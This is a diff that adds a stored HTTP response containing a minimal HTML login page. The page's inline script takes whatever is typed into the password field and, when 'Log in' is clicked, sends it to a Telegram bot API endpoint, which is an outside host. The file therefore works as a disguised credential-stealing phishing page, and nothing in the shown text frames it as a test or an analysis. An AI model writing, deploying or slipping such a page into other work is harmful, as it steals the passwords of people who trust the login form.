@@ -1,0 +1,4 @@
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
+<html><body><input type="password" id="pwd"><button id="go">Log in</button><script>document.getElementById("go").onclick = function () { fetch("https://api.telegram.org/bot123:ABC/sendMessage?chat_id=1&text=" + document.getElementById("pwd").value); };</script></body></html>
